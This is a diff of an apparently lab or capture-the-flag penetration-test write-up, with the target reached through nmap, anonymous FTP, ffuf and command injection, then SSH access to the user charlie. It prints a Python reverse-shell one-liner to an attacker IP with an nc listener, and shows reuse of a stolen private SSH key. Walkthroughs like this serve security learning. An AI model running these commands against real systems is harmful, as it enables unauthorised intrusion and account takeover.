@@ -11,7 +11,7 @@ Nmap scan: The pentest started with a nmap scan using
 nmap -T4 -sV -A 10.10.12.204  
 ![image](https://github.com/user-attachments/assets/d6c9ab51-46d6-495e-981e-8544c5f4d30c)
 
-This have back the services running on the server,
+This gave  back the services running on the server,
 
 
 a. Port 21: This allowed anonymous login, and the port was accessed using 
@@ -22,7 +22,7 @@ After a succesful login, the file was downloaded
 
 
 
-picture showing the download 
+picture showing the downloaded file 
 ![gum_room](https://github.com/user-attachments/assets/39218184-a257-44b5-9826-ecdcd8ec7f1d)
 
 b.  80: The website has a homepage with a login form
@@ -30,6 +30,7 @@ b.  80: The website has a homepage with a login form
 The homepage
 ![image](https://github.com/user-attachments/assets/88eac3bd-6883-4760-a27f-67bc0fafd0b0)
 
+The source code of the page ws checked out, and from it, a link tagged "validatee.php" was found which proved that the website was running on php 
 
 The port 80 was subjected to directory bruteforce using FFUF
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.12.204/FUZZ -e .php, .HTML 
@@ -49,9 +50,9 @@ Trying the comman d"Cat /etc", the website gave a response showing that it is vu
 
 
 
-the website was querried to confirm if there is a python binary on it 
+using the command " which python3 " on the page, the server hosting website was querried to confirm if there is a python binary on it , and the response showed that there is a python binary
 
-using the command 
+then using the command 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.106.235",2294));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 and
 nc -nlvp 2249
@@ -69,7 +70,7 @@ Part B: Privilege escalation
 After initial access was gained with the user www-data
 some files were found in the directory which includes key_rev_key
 
-Using the command "strings" to check the content of the file "key_rev_key"
+Using the command "strings" to check the content of the file "key_rev_key", a key was found
 ![image](https://github.com/user-attachments/assets/af1530b0-29d1-4246-a24c-22a9777c0180)
 
 
@@ -79,9 +80,7 @@ Thn I navigated to charlie's home directory and files like telport, telport.pub 
 the content of charlie's home directory
 ![image](https://github.com/user-attachments/assets/fc896cf9-6549-4345-90e2-ecf7d2debc0c)
 
-
-
-The teleport file contained a private ssh key, this key was copied and saved on the attacker's machine 
+The teleport file contained a private ssh key, this key was copied and saved on the attacker's machine with the name "charley' 
 
 The key was then used to login to charlie's account via ssh 
 ssh charlie@10.10.12.204 -i charley 
@@ -91,7 +90,10 @@ Picture showing a successful login
 
 
 
+A user flag was then found in the user home directory..
 
+
+Then to gaining root access..... coming soon 
 
 
 
